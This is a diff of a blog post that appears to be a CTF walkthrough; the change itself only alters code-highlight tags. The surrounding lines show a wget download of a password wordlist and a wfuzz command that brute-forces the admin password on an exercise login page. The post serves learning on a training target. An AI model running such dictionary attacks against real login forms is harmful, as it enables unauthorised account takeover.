@@ -19,7 +19,7 @@ Let's be good boys and listen to the web page talking! Googling "filetype:lst pa
 http://www.openwall.com/passwords/wordlists/password-2011.lst  
 Download the password list in our local directory.
 
-{% highlight bash linenos %}
+{% highlight bash  %}
 /infosec2$ wget http://www.openwall.com/passwords/wordlists/password-2011.lst
 --2015-07-17 19:14:21--  http://www.openwall.com/passwords/wordlists/password-2011.lst
 Resolving www.openwall.com (www.openwall.com)... 195.42.179.202
@@ -38,7 +38,7 @@ Saving to: `password-2011.lst'
 This time we are not going to use Burpsuite, because Burpsuite's Intruder feature is being throttled in the free edition of Burp.
 Instead we are going to use a tool called wfuzz. The syntax is as follows:
 
-{% highlight bash linenos %}
+{% highlight bash  %}
 /infosec2$ wfuzz -c -z file,password-2011.lst -d "username=admin&password=FUZZ&logIn=Login" http://ctf.infosecinstitute.com/ctf2/exercises/ex12.php
 {% endhighlight %}
 
@@ -49,7 +49,7 @@ submission form. And at the end we need to send our request to the correct URL a
 Wfuzz is going to start using each of the words in our dictionary file in place of the keyword 'FUZZ' which we placed
 in the POST data of the request.
 
-{% highlight bash linenos %}
+{% highlight bash  %}
 /infosec2# wfuzz -c -z file,password-2011.lst -d "username=admin&password=FUZZ&logIn=Login" http://ctf.infosecinstitute.com/ctf2/exercises/ex12.php
 
 ********************************************************
